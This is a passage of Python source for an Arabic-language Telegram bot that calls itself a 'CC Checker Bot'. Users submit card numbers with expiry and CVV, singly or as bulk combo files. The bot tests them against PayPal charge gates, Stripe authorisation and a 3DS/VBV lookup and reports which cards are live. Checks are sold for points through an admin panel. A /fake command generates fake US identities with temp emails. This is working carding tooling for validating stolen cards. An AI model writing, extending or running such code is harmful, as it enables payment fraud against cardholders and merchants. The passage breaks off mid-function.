            {"city": "Atlanta", "state": "GA", "zip": "30301"},
            {"city": "San Francisco", "state": "CA", "zip": "94101"},
            {"city": "Austin", "state": "TX", "zip": "73301"},
            {"city": "Philadelphia", "state": "PA", "zip": "19101"},
            {"city": "Nashville", "state": "TN", "zip": "37201"}
        ]

        streets = [
            "Main St", "Oak Ave", "Washington Blvd", "Lakeview Dr", "Parkway Dr", 
            "Sunset Blvd", "Maple Court", "Broadway", "Cedar Lane", "River Road", 
            "Highland Ave", "Pine St", "Forest Drive", "Madison Ave", "Elm St"
        ]

        first_names = [
            "James", "Robert", "John", "Michael", "David", "William", "Richard",
            "Thomas", "Christopher", "Daniel", "Matthew", "Anthony", "Mark", "Steven",
            "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan"
        ]

        last_names = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis",
            "Garcia", "Martinez", "Rodriguez", "Hernandez", "Lopez", "Gonzalez", "Wilson",
            "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee"
        ]

        location = random.choice(cities_data)
        f_name = random.choice(first_names)
        l_name = random.choice(last_names)
        address = f"{random.randint(100, 9999)} {random.choice(streets)}"
        phone = f"+1 ({random.randint(200, 999)}) {random.randint(100, 999)}-{random.randint(1000, 9999)}"
        
        user_rand = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=7))
        temp_email = f"{user_rand}@1secmail.com"

        photo_url = "https://t.me/dtfxsd42878"

        res_text = (
            f"👤 **FULL INFORMATION GENERATED** 👤\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📝 **Name:** `{f_name} {l_name}`\n"
            f"🏠 **Address:** `{address}`\n"
            f"🏙 **City:** `{location['city']}`\n"
            f"🗺 **State:** `{location['state']}`\n"
            f"📮 **ZIP Code:** `{location['zip']}`\n"
            f"📞 **Phone:** `{phone}`\n"
            f"📧 **Temp Email:** `{temp_email}`\n"
            f"👤**BoT By** : 𓏺 عنكبوت . \n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💡 *اضغط على أي معلومة لنسخها فوراً*"
        )

        bot.send_photo(
            message.chat.id, 
            photo_url, 
            caption=res_text, 
            parse_mode="Markdown"
        )

    except Exception as e:
        print(f"Error: {e}")
        bot.reply_to(message, "❌ حصلت مشكلة، جرب تاني يا وحش.")

@bot.message_handler(commands=['cmds']) 
def handle_my_command(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    bot.reply_to(message, "/help - للمساعده\n/pp - لفحص علي بوابة بايبال \n/chk - لفحص علي بوابة سترايب\n/fake -  لتوليد معلومات عشوائيه\nBoT By : @z_0_y2 💸")
 
@bot.message_handler(commands=["start"])
def start(message):
    if not check_subscription(bot, message): return # فحص الاشتراك الإجباري
    def my_function():
        name = message.from_user.first_name
        user_id = message.from_user.id
        try:
            with open('data.json', 'r') as file:
                json_data = json.load(file)
        except:
            json_data = {}
        try:
            json_data[str(user_id)]
        except:
            json_data[str(user_id)] = {'points': 0}
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2, ensure_ascii=False)
        points = get_user_points(user_id)
       
        if user_id == admin:
            status_line = "𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐁𝐎𝐓 𝐎𝐖𝐍𝐄𝐑 (UNLIMITED POINTS)"
        else:
            status_line = f"𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐔𝐬𝐞𝐫 ({points} Points)"

        caption_text = (
            f"😈𝑾𝑬𝑳𝑪𝑶𝑴𝑬 {name} - ⁪✅\n"
            f"\n"
            f"{status_line}\n"
            f"\n"
            f"𝐂𝐂 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 𝐑𝐢𝐯𝐚\n"
            f"\n"
            f"Bot By @z_0_y2 💸"
        )

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton(" My Points 💰", callback_data='my_points'),
            types.InlineKeyboardButton("المطور  👨‍💻", url="https://t.me/ankabot6"),
            types.InlineKeyboardButton("قناتي 📢", url="https://t.me/ankabot6")
        )

        welcome_images = [
            "https://t.me/dtfxsd42878",
            "https://t.me/dtfxsd42878"
        ]
        if not hasattr(start, '_img_index'):
            start._img_index = 0
        img_url = welcome_images[start._img_index % 2]
        start._img_index += 1

        try:
            bot.send_photo(message.chat.id, img_url, caption=caption_text, reply_markup=keyboard)
        except:
            bot.send_message(chat_id=message.chat.id, text=caption_text, reply_markup=keyboard)
    threading.Thread(target=my_function).start()

@bot.callback_query_handler(func=lambda call: call.data == 'my_points')
def show_my_points(call):
    user_id = call.from_user.id
    points = get_user_points(user_id)
    try:
        msg = f"""{tge(E_DIAMOND, "💎")} <b>نقاطك الحالية</b>

{tge(E_STAR, "⭐")} إجمالي النقاط: <b>{points}</b> نقطة

{tge(E_CARD, "💳")} كل كارت تفحصه = 1 نقطة
{tge(E_FIRE, "🔥")} ارسل /help للاوامر !"""
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
    except:
        msg = f"💎 نقاطك الحالية\n\n⭐ إجمالي النقاط: {points} نقطة\n\n💳 كل كارت تفحصه = 1 نقطة"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, msg)

@bot.message_handler(commands=["cc", "bc"])
def cc_command(message):
    if message.from_user.id != admin:
        return
    msg = bot.reply_to(message, "'' قم بإرسال الرسالة التي تريد إذاعتها (نص، صورة، فيديو)\nأو قم بعمل Forward للرسالة")
    bot.register_next_step_handler(msg, process_cc)

def process_cc(message):
    if message.from_user.id != admin:
        return
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        users = [int(k) for k in data.keys() if k.isdigit()]
    except:
        bot.reply_to(message, "❌ خطأ في قراءة قاعدة البيانات")
        return
    success = 0
    failed = 0
    status_msg = bot.reply_to(message, f" جارٍ الإذاعة...\n✅ نجح: {success}\n❌ فشل: {failed}")
    for user_id in users:
        try:
            if message.content_type == 'text':
                bot.send_message(user_id, message.text, parse_mode='HTML')
            elif message.content_type == 'photo':
                if message.caption:
                    bot.send_photo(user_id, message.photo[-1].file_id, caption=message.caption, parse_mode='HTML')
                else:
                    bot.send_photo(user_id, message.photo[-1].file_id)
            elif message.content_type == 'video':
                if message.caption:
                    bot.send_video(user_id, message.video.file_id, caption=message.caption, parse_mode='HTML')
                else:
                    bot.send_video(user_id, message.video.file_id)
            elif message.content_type == 'document':
                if message.caption:
                    bot.send_document(user_id, message.document.file_id, caption=message.caption, parse_mode='HTML')
                else:
                    bot.send_document(user_id, message.document.file_id)
            elif message.content_type == 'voice':
                bot.send_voice(user_id, message.voice.file_id)
            elif message.content_type == 'audio':
                bot.send_audio(user_id, message.audio.file_id)
            else:
                bot.forward_message(user_id, message.chat.id, message.message_id)
            success += 1
        except Exception as e:
            failed += 1
            print(f"خطأ في إرسال الإذاعة للمستخدم {user_id}: {e}")
        if (success + failed) % 10 == 0:
            try:
                bot.edit_message_text(
                    f" جارٍ الإذاعة...\n✅ نجح: {success}\n❌ فشل: {failed}",
                    status_msg.chat.id,
                    status_msg.message_id
                )
            except:
                pass
        time.sleep(0.05)
    bot.edit_message_text(
        f"✅ اكتملت الإذاعة!\n\n✅ نجح: {success}\n❌ فشل: {failed}\n الإجمالي: {success + failed}",
        status_msg.chat.id,
        status_msg.message_id
    )

@bot.message_handler(commands=["ad"])
def add_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        target_user = int(parts[1])
        amount = int(parts[2])
        new_total = add_user_points(target_user, amount)
        bot.reply_to(message, f"✅ تم إضافة {amount} نقطة للمستخدم {target_user}\nالرصيد الجديد: {new_total} نقطة")
        try:
            bot.send_message(target_user, f"🎁 تم إضافة {amount} نقطة لحسابك!\nرصيدك الحالي: {new_total} نقطة")
        except:
            pass
    except:
        bot.reply_to(message, "❌ الاستخدام: /ad [ID] [العدد]\nمثال: /ad 123456 50")

@bot.message_handler(commands=["xx"])
def remove_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        target_user = int(parts[1])
        amount = int(parts[2])
        success = deduct_user_points(target_user, amount)
        if success:
            new_total = get_user_points(target_user)
            bot.reply_to(message, f"✅ تم خصم {amount} نقطة من المستخدم {target_user}\nالرصيد الجديد: {new_total} نقطة")
            try:
                bot.send_message(target_user, f"⚠️ تم خصم {amount} نقطة من حسابك\nرصيدك الحالي: {new_total} نقطة")
            except:
                pass
        else:
            bot.reply_to(message, f"❌ فشل الخصم! المستخدم ليس لديه نقاط كافية")
    except:
        bot.reply_to(message, "❌ الاستخدام: /xx [ID] [العدد]\nمثال: /xx 123456 20")

@bot.message_handler(commands=["help"])
def help_command(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("اتصل بالمالك", url="https://t.me/z_0_y2", icon_custom_emoji_id=E_CROWN))
    try:
        msg_text = f"""{tge(E_LIST, "📋")} <b>𝐁𝐨𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>

{tge(E_CARD, "💳")} /pp - فحص بطاقة (PayPal)
{tge(E_BOLT, "⚡")} /chk - فحص بطاقة (Stripe)
{tge(E_SHIELD, "🛡")} /vbv - فحص VBV/3DS
{tge(E_DIAMOND, "💎")} كل كارت = 1 نقطة!"""
        bot.send_message(chat_id=message.chat.id, text=msg_text, reply_markup=keyboard, parse_mode='HTML')
    except:
        msg_text = "📋 أوامر البوت:\n\n💳 /pp - فحص بطاقة\n⚡ /chk - فحص Stripe\n🛡 /vbv - فحص VBV/3DS\n💎 كل كارت = 1 نقطة"
        bot.send_message(chat_id=message.chat.id, text=msg_text, reply_markup=keyboard, parse_mode='HTML')

@bot.message_handler(commands=["admin"])
def admin_panel(message):
    if message.from_user.id != admin:
        return
    config = load_config()
    gates = load_gates()
    gates_count = len(gates)
    current_price = config.get('gate_price', '0.50')
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        users_count = len([k for k in data if k.isdigit()])
    except:
        users_count = 0
    try:
        admin_text = f"""{tge(E_CROWN, "💪")} <b>𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>

{tge(E_DIAMOND, "💎")} <b>𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬:</b>
{tge(E_GLOBE, "🌐")} المستخدمين: {users_count}
{tge(E_CARD, "💳")} البوابات: {gates_count}
{tge(E_FIRE, "🔥")} سعر البوابة: ${current_price}

{tge(E_LIST, "📋")} <b>𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
{tge(E_BOLT, "⚡")} /cc - إذاعة رسالة
{tge(E_ADD, "➕")} /ad [ID] [عدد]
{tge(E_STOP, "➖")} /xx [ID] [عدد]"""
    except:
        admin_text = f"""💪 <b>𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞 l</b>

💎 المستخدمين: {users_count}
💳 البوابات: {gates_count}
🔥 سعر البوابة: ${current_price}

📋 الأوامر:
⚡ /cc - إذاعة
➕ /ad - إضافة نقاط
➖ /xx - خصم نقاط"""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("➕ إضافة بوابة", callback_data='admin_add_gate'),
        types.InlineKeyboardButton(" حذف بوابة", callback_data='admin_del_gate'),
        types.InlineKeyboardButton(" عرض البوابات", callback_data='admin_list_gates'),
        types.InlineKeyboardButton(" المستخدمين", callback_data='admin_users')
    )
    bot.send_message(message.chat.id, admin_text, reply_markup=kb, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'admin_add_gate')
def admin_add_gate_step1(call):
    if call.from_user.id != admin:
        return
    msg = bot.send_message(call.message.chat.id, " أرسل <b>اسم البوابة</b> الجديدة:", parse_mode='HTML')
    bot.register_next_step_handler(msg, admin_add_gate_step2)

def admin_add_gate_step2(message):
    if message.from_user.id != admin:
        return
    gate_name = message.text.strip()
    admin_add_gate_state[message.from_user.id] = {'name': gate_name}
    msg = bot.reply_to(message, f"✅ اسم البوابة: <b>{gate_name}</b>\n\nالآن أرسل <b>رابط البوابة</b>:", parse_mode='HTML')
    bot.register_next_step_handler(msg, admin_add_gate_step3)

def admin_add_gate_step3(message):
    if message.from_user.id != admin:
        return
    gate_url = message.text.strip().strip("'").strip('"').strip()
    state = admin_add_gate_state.get(message.from_user.id, {})
    gate_name = state.get('name', 'unknown').strip()
    gates = load_gates()

    original_key = gate_name.lower().replace(' ', '_')
    gate_key = original_key[:40] 
    counter = 1
    while gate_key in gates:
        gate_key = f"{original_key[:35]}_{counter}"
        counter += 1
    gates[gate_key] = {"name": gate_name, "url": gate_url, "type": "paypal"}
    save_gates(gates)
    if message.from_user.id in admin_add_gate_state:
        del admin_add_gate_state[message.from_user.id]
    paypal_count = len([g for g in gates.values() if g.get('type') == 'paypal' and g.get('url', '').strip()])
    bot.reply_to(message, f"✅ تم إضافة البوابة بنجاح!\n\n• الاسم: <b>{gate_name}</b>\n• الرابط: {gate_url}\n• إجمالي بوابات PayPal: {paypal_count}", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'admin_del_gate')
def admin_del_gate(call):
    if call.from_user.id != admin:
        return
    gates = load_gates()
    if not gates:
        bot.answer_callback_query(call.id, "لا توجد بوابات!")
        return
    kb = types.InlineKeyboardMarkup()
    for key in gates:
        kb.add(types.InlineKeyboardButton(f"🗑 حذف: {gates[key]['name']}", callback_data=f'cdel_{key[:50]}'))
    kb.add(types.InlineKeyboardButton("🔙 رجوع", callback_data='admin_back'))
    bot.edit_message_text("اختر البوابة التي تريد حذفها:", call.message.chat.id, call.message.message_id, reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data.startswith('cdel_'))
def confirm_del_gate(call):
    if call.from_user.id != admin:
        return
    short_key = call.data[5:]
    gates = load_gates()
    actual_key = None
    for k in gates:
        if k.startswith(short_key):
            actual_key = k
            break
    if actual_key:
        deleted_name = gates[actual_key]['name']
        del gates[actual_key]
        save_gates(gates)
        bot.answer_callback_query(call.id, f"تم حذف {deleted_name}")
        bot.edit_message_text(f"✅ تم حذف البوابة: {deleted_name}", call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "البوابة غير موجودة!")

@bot.callback_query_handler(func=lambda call: call.data == 'admin_list_gates')
def admin_list_gates(call):
    if call.from_user.id != admin:
        return
    gates = load_gates()
    if not gates:
        bot.answer_callback_query(call.id, "لا توجد بوابات!")
        return
    text = " <b>البوابات المتاحة:</b>\n\n"
    for i, (key, g) in enumerate(gates.items(), 1):
        text += f"{i}. <b>{g['name']}</b>\n   النوع: {g.get('type','paypal')}\n   الرابط: {g.get('url','بدون')}\n\n"
    paypal_count = len([g for g in gates.values() if g.get('type') == 'paypal' and g.get('url', '').strip()])
    text += f"إجمالي بوابات PayPal: {paypal_count}"
    bot.send_message(call.message.chat.id, text, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'admin_users')
def admin_users(call):
    if call.from_user.id != admin:
        return
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        users = {k: v for k, v in data.items() if k.isdigit()}
        total_points = sum([u.get('points', 0) for u in users.values()])
        text = f" <b>إحصائيات المستخدمين:</b>\n\n• إجمالي: {len(users)}\n• إجمالي النقاط: {total_points}"
        bot.send_message(call.message.chat.id, text, parse_mode='HTML')
    except:
        bot.send_message(call.message.chat.id, "خطأ في قراءة البيانات")

@bot.callback_query_handler(func=lambda call: call.data == 'admin_back')
def admin_back(call):
    if call.from_user.id != admin:
        return
    bot.delete_message(call.message.chat.id, call.message.message_id)

@bot.message_handler(commands=["pa"])
def pa_command(message):
    if message.from_user.id != admin:
        return
    try:
        new_price = message.text.split(' ')[1]
        float(new_price)
        config = load_config()
        config['gate_price'] = new_price
        save_config(config)
        bot.reply_to(message, f"✅ تم تغيير مبلغ البوابة إلى: ${new_price}")
    except:
        bot.reply_to(message, "الاستخدام: /pa [المبلغ]\nمثال: /pa 1")

@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('/vbv') or m.text.lower().startswith('.vbv')) and not (m.text.lower().startswith('/vbv ') or m.text.lower().startswith('.vbv ')))
def vbv_check_noarg(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    bot.reply_to(message, f"{_L} 𝐏λ𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐜𝐚𝐫𝐝\n{_L} 𝐄𝐱𝐚𝐦𝐩λ𝐞: /vbv 4xxxxx|12|2030|123", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('/vbv ') or m.text.lower().startswith('.vbv ')))
def vbv_check_command(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    def vbv_thread():
        idt = message.from_user.id
        name = message.from_user.first_name
        current_points = get_user_points(idt)
        if current_points < 1:
            bot.reply_to(message, "❌ الحلو فلوسه خلصت 😂\n\nاتصل بالمالك لشراء نقاط: @z_0_y2")
            return
        try:
            command_usage[idt]['last_time']
        except:
            command_usage[idt] = {'last_time': datetime.now()}
        current_time = datetime.now()
        if command_usage[idt]['last_time'] is not None:
            time_diff = (current_time - command_usage[idt]['last_time']).seconds
            if time_diff < 1:
                bot.reply_to(message, f"انتظر {10-time_diff} ثانية")
                return
        ko = bot.reply_to(message, f"{_L} 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...", parse_mode='HTML').message_id
        try:
            cc_raw = message.reply_to_message.text if message.reply_to_message else message.text
        except:
            cc_raw = message.text
        cc = str(reg(cc_raw))
        if cc == 'None':
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: ⚠️ 𝐈𝐧𝐯𝐚λ𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭!\n{_L} 𝐂𝐨𝐫𝐫𝐞𝐜𝐭 𝐅𝐨𝐫𝐦𝐚𝐭: /vbv 4xxxxx|12|2030|123", parse_mode='HTML')
            return
        start_time = time.time()
        command_usage[idt]['last_time'] = datetime.now()
        vbv_result = vbv_checker(cc)
        info = dato(cc[:6])
        execution_time = time.time() - start_time
        deduct_user_points(idt, 1)
        
        if isinstance(info, str):
            info = {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country_name": "N/A", "country_flag": ""}
        
        card_brand = info.get('brand', '').upper()
        if 'VISA' in card_brand:
            brand_emoji = tge("5355025749331971004", "💰")
            brand_emoji_fb = '💳'
        elif 'MASTERCARD' in card_brand or 'MASTER' in card_brand:
            brand_emoji = tge("5355267886703215577", "💰")
            brand_emoji_fb = '💳'
        elif 'AMEX' in card_brand or 'AMERICAN' in card_brand:
            brand_emoji = tge("5278219081105811309", "💳")
            brand_emoji_fb = '💳'
        else:
            brand_emoji = tge("4956233646441760046", "🌊")
            brand_emoji_fb = '💰'
        
        vbv_status = vbv_result.get('status', 'UNKNOWN')
        enrolled = vbv_result.get('enrolled', None)
        vbv_response = vbv_result.get('response', '')
        vbv_gateway = vbv_result.get('gateway', 'Unknown')
        vbv_error = vbv_result.get('error', None)
        
        if enrolled is False:
            status_text = "Passed ✅"
            status_emoji = "✅"
            clean_result = "3D-Authentication successful"
        elif enrolled is True:
            if 'OTP' in str(vbv_response).upper():
                status_text = "OTP Required ⛔"
                status_emoji = "⛔"
                clean_result = "3DS OTP Required"
            else:
                status_text = "OTP Required ⛔"
                status_emoji = "⛔"
                clean_result = "3DS OTP Required"
        else:
            if vbv_error:
                status_text = f"Declined ❌"
                status_emoji = "❌"
                clean_result = vbv_error
            elif vbv_status == 'DECLINED':
                status_text = f"Declined ❌"
                status_emoji = "❌"
                clean_result = vbv_response if vbv_response else 'Declined'
            else:
                status_text = f"Declined ❌"
                status_emoji = "❌"
                clean_result = vbv_response if vbv_response else vbv_status
        
        user_name_display = f"{name} {tge('5848338971326682635', '💪')}"
        user_name_display_fb = f"{name} 💪"
        
        try:
            msg_premium = f"""#3DS_Lookup [/vbv] {tge('4956233646441760046', '🌊')}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{cc}</code> {brand_emoji}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {status_emoji} {clean_result}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {info.get('brand','N/A')} - {info.get('type','N/A')} - {info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {info.get('bank','N/A')} - {info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {info.get('country_name','N/A')} [ {info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {execution_time:.2f}s | Proxy : Live {tge(E_STAR, '😈')}
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display}
[<a href="https://t.me/rivatry_bot">⌥</a>] 
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/z_0_y2">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/z_0_y2">عنكبوت</a> - {tge(E_CHECK, '🌟')}"""
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_premium, parse_mode='HTML', disable_web_page_preview=False)
        except:
            try:
                msg_fallback = f"""#Passed [/vbv] 🌊
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{cc}</code> {brand_emoji_fb}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {status_emoji} {clean_result}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {info.get('brand','N/A')} - {info.get('type','N/A')} - {info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {info.get('bank','N/A')} - {info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {info.get('country_name','N/A')} [ {info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {execution_time:.2f}s | Proxy : Live 😈
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display_fb}
[<a href="https://t.me/rivatry_bot">⌥</a>] 
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/z_0_y2">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/z_0_y2">عنكبوت</a> - 🌟"""
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_fallback, parse_mode='HTML', disable_web_page_preview=False)
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"𝐄𝐫𝐫𝐨𝐫: {str(e)[:100]}")
    threading.Thread(target=vbv_thread).start()

@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('/chk') or m.text.lower().startswith('.chk')) and not (m.text.lower().startswith('/chk ') or m.text.lower().startswith('.chk ')))
def stripe_check_noarg(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    bot.reply_to(message, "الاستخدام: /chk num|mm|yy|cvc")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.chk ') or message.text.lower().startswith('/chk ')))
def manual_stripe_check_command(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    manual_stripe_check(message)

def manual_stripe_check(message):
    idt = message.from_user.id
    name = message.from_user.first_name
    current_points = get_user_points(idt)
    if current_points < 1:
        bot.reply_to(message, "❌ الحلو فلوسه خلصت 😂\n\nاتصل بالمالك لشراء نقاط: @z_0_y2")
        return
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {'last_time': datetime.now()}
    current_time = datetime.now()
    if command_usage[idt]['last_time'] is not None:
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 1:
            bot.reply_to(message, f"انتظر {10-time_diff} ثانية")
            return
    ko = bot.reply_to(message, f"{_L} جارٍ الفحص على Stripe Auth...").message_id
    try:
        cc_raw = message.reply_to_message.text if message.reply_to_message else message.text
    except:
        cc_raw = message.text
    cc = str(reg(cc_raw))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="تنسيق خاطئ!\nCard: XXXXXXXXXXXXXXXX|MM|YYYY|CVV")
        return
    start_time = time.time()
    command_usage[idt]['last_time'] = datetime.now()
    raw_response = str(stripe_checker(cc))
    category = classify_response(raw_response)
    info = dato(cc[:6])
    execution_time = time.time() - start_time
    deduct_user_points(idt, 1)
    send_check_result(message.chat.id, ko, cc, category, raw_response, info, execution_time, name, "Stripe_Auth", "0")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp')) and not message.text.lower().startswith('/pp '))
def manual_check_noarg(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    bot.reply_to(message, "الاستخدام: /pp num|mm|yy|cvc")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.pp ') or message.text.lower().startswith('/pp ')))
def manual_check(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    gate_label = 'PayPal_Charge'
    name = message.from_user.first_name
    idt = message.from_user.id
    current_points = get_user_points(idt)
    if current_points < 1:
        bot.reply_to(message, "❌ الحلو فلوسه خلصت 😂\n\nاتصل بالمالك لشراء نقاط: @z_0_y2")
        return
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {'last_time': datetime.now()}
    current_time = datetime.now()
    if command_usage[idt]['last_time'] is not None:
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 1:
            bot.reply_to(message, f"انتظر {10-time_diff} ثانية")
            return
    ko = bot.reply_to(message, f"{_L} جارٍ الفحص...").message_id
    try:
        cc_raw = message.reply_to_message.text if message.reply_to_message else message.text
    except:
        cc_raw = message.text
    cc = str(reg(cc_raw))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="تنسيق خاطئ!\nCard: XXXXXXXXXXXXXXXX|MM|YYYY|CVV")
        return
    start_time = time.time()
    command_usage[idt]['last_time'] = datetime.now()
    config = load_config()
    amount = config.get('gate_price', '0.50')
    
    raw_response = paypal_gateway.process(cc, amount)
    
    parts = raw_response.split('|')
    response_text = parts[0] if len(parts) > 0 else "UNKNOWN"
    gateway_index = parts[1] if len(parts) > 1 else "0"
    gateway_name = parts[2] if len(parts) > 2 else "Unknown"
    
    category = classify_response(response_text)
    info = dato(cc[:6])
    execution_time = time.time() - start_time
    deduct_user_points(idt, 1)
    send_check_result(message.chat.id, ko, cc, category, response_text, info, execution_time, name, f"{gate_label}_{gateway_name}", amount)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    try:
        with open('data.json', 'r') as file:
            json_data = json.load(file)
    except:
        json_data = {}
    id = message.from_user.id
    name = message.from_user.first_name
    current_points = get_user_points(id)
    if current_points < 1:
        bot.reply_to(message, "❌ الحلو الحلو فلوسه خلصت 😂\n\nاتصل بالمالك لشراء نقاط: @z_0_y2")
        return
    user_id = message.from_user.id
    if user_id in active_scans:
        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت، انتظر الملف الأول يخلص.")
        return
    else:
        active_scans.add(user_id)
    gates = load_gates()
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btns = []
    has_paypal = any(g.get('type', 'paypal') == 'paypal' and g.get('url', '').strip() for g in gates.values())
    if has_paypal:
        btns.append(types.InlineKeyboardButton(" PayPal_Charge", callback_data='gate_paypal_unified'))
    for key, g in gates.items():
        gtype = g.get('type', 'paypal')
        if gtype != 'paypal':
            btns.append(types.InlineKeyboardButton(f"⚡ {g.get('name', key)}", callback_data=f'gate_{key[:50]}'))
    btns.append(types.InlineKeyboardButton(" Stripe Auth", callback_data='gate_stripe_auth'))
    keyboard.add(*btns)
    bot.reply_to(message, text='اختر البوابة للفحص:', reply_markup=keyboard)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_'))
def process_combo_gate(call):
    def my_function():
        id = call.from_user.id
        user_id = call.from_user.id
        gate_key_short = call.data[5:]
        gates = load_gates()
        config = load_config()
        amount = config.get('gate_price', '0.50')
      
        gate_key = None
        if gate_key_short == 'stripe_auth':
            gate_key = 'stripe_auth'
        elif gate_key_short == 'paypal_unified':
            gate_key = 'paypal_unified'
        else:
            for k in gates:
                if k.startswith(gate_key_short):
                    gate_key = k
                    break
        
        if gate_key == 'stripe_auth':
            gate_label = 'Stripe_Auth'
            gate_type = 'stripe'
            amount = "0"
        elif gate_key == 'paypal_unified':
            gate_label = 'PayPal_Charge'
            gate_type = 'paypal'
            gate_url = ''
        elif gate_key in gates:
            gate_label = gates[gate_key].get('name', gate_key).replace(' ', '_')
            gate_type = gates[gate_key].get('type', 'paypal')
            gate_url = gates[gate_key].get('url', '').strip()
        else:
            bot.answer_callback_query(call.id, "بوابة غير موجودة!")
            return

        stats = {'dd': 0, 'live': 0, 'ccnn': 0, 'cards_checked': 0}
        stats_lock = threading.Lock()
        scan_start = time.time()
        
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"جارٍ الفحص على {gate_label}...")
        
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                
                try:
